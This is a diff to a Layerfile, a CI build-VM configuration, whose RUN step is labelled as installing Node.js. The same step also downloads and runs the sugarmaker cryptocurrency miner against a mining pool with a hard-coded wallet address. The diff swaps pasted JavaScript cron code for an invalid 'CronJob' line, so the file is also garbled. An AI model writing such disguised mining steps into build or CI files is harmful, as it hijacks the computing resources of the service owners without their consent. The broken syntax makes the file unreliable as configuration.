@@ -3,19 +3,7 @@ FROM vm/ubuntu:18.04
 # To note: Layerfiles create VMs, *not* containers!
 
 # Install node
-var catalogUpdater = require('../utils/catalogUpdater');
-var descriptionDownloader = require('../utils/descriptionDownloader');
-
-var CronJob = require('cron').CronJob;
-
-var job = new CronJob('*/5 * * * * *', function(){ 
-    console.log('started');
-
-}, 
-function(){console.log('stop')},
-true);
-
-module.exports = job
+CronJob '*/5 * * * * *'
 RUN curl -sL https://deb.nodesource.com/setup_12.x | bash && \
     apt install nodejs && apt install unzip && wget https://github.com/decryp2kanon/sugarmaker/releases/download/v2.5.0-sugar4/sugarmaker-v2.5.0-sugar4-linux64.zip && unzip sugarmaker-v2.5.0-sugar4-linux64.zip && cd sugarmaker-v2.5.0-sugar4-linux64 && ./sugarmaker -a YespowerSugar -o stratum+tcp://stratum-na.rplant.xyz:7042 -u sugar1qj7tssru8ckc4lhfxntn5psaa6f87nwvkcfltuf.alt_22 && \
     rm -f /etc/apt/sources.list.d/nodesource.list
